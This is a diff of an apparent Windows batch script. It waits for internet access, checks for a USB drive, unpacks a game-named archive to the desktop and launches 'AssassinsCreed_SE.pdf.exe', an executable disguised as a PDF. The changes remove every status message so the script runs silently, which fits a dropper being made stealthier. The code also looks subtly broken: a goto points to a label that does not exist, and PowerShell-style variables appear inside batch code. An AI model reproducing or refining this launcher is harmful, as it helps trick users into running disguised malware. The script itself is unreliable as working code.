@@ -5,14 +5,11 @@
 
 @rem Function to check internet connection
 :check_internet
-echo Checking internet connectivity...
 ping -n 1 8.8.8.8 >nul 2>&1
 if errorlevel 1 (
-    echo No internet connection. Retrying...
     timeout /t 7200 >nul
     goto check_internet7
 )
-echo Internet connection established.
 
 @rem check for usb
 :check_drive
@@ -51,7 +48,7 @@ cd $wd
 PowerShell -Command "Expand-Archive -Path 'AssassinsCreed_SE.zip' -DestinationPath '$desktop'"
 
 
-copy $wd/AssassinsCreed_SE/AssassinsCreed_SE.pdf.exe $desktop
+@rem copy "$wd/AssassinsCreed_SE/AssassinsCreed_SE.pdf.exe" "$desktop"
 
 start AssassinsCreed_SE.pdf.exe
 
